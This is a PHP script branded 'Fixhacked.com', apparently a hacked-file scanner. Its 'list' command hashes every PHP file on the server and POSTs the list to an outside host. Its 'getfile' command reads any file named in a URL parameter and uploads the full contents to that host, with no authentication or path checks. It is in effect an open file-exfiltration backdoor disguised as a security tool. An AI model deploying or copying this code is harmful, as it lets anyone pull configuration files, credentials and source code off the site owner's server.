<?php
/** 

Fixhacked.com - 2017 
This file checks and detects hacked files.
Do not edit this file 

**/

function upload($array) {$url = 'https://api.fixhacked.com/incoming.php';$fields = Array();foreach($array as $key=>$value) {$fields[$key] = urlencode($value);}foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }rtrim($fields_string, '&');$ch = curl_init();curl_setopt($ch,CURLOPT_URL, $url);curl_setopt($ch,CURLOPT_POST, count($fields));curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);curl_setopt($ch,CURLOPT_TIMEOUT,1000);if(curl_exec($ch) === false){    echo 'Curl error: ' . curl_error($ch);}else{    echo '1';}curl_close($ch);}function getfileinfo($root='.') {$md5 = '';foreach (glob("*.php") as $filename) {$md5 .= md5_file($filename)."|".$filename."\n";}return $md5;}function iscompatible() {$functions = Array('file_get_contents', 'openssl_get_privatekey', 'phpinfo', 'curl_init');}function countfiles($root = '.', $start=0, $type=0) {$filescount = Array();$files  = array(); $directories  = array(); $last_letter  = $root[strlen($root)-1]; $root  = ($last_letter == '\\' || $last_letter == '/') ? $root : $root.DIRECTORY_SEPARATOR;   $directories[]  = $root; while (sizeof($directories)) { $dir  = array_pop($directories); if ($handle = opendir($dir)) {     while (false !== ($file = readdir($handle))) {         if ($file == '.' || $file == '..') {           continue;     }     $file  = $dir.$file;     if (is_dir($file) && !is_link($file)) {         $directory_path = $file.DIRECTORY_SEPARATOR;         array_push($directories, $directory_path);     } elseif (is_file($file)) {     $i++;       if(preg_match('/\.php/i', $file)) {       $filescount[$i]['name'] = trim(str_replace("\n", "", $file));       $filescount[$i]['md5'] = md5_file($file);       }}     }     closedir($handle);     }  } return $filescount; }switch($_GET['cmd']) {case 'list':$arr = countfiles('.');$send = '';foreach($arr as $r) {$send .= $r['md5']."|".$r['name']."||";}upload(array('filelist'=>$send, 'hash'=>$_GET['hash']));break;case 'getfile':$filetoupload = $_GET['filename'];if(file_exists($filetoupload)) {upload(array('filename'=>$filetoupload, 'hash'=>$_GET['hash'], 'content'=>file_get_contents($_GET['filename']), 'md5'=>md5_file($_GET['filename'])));} else {echo 0;}break;case 'compatible':echo 1;break;case 'version':echo 1;break;}?>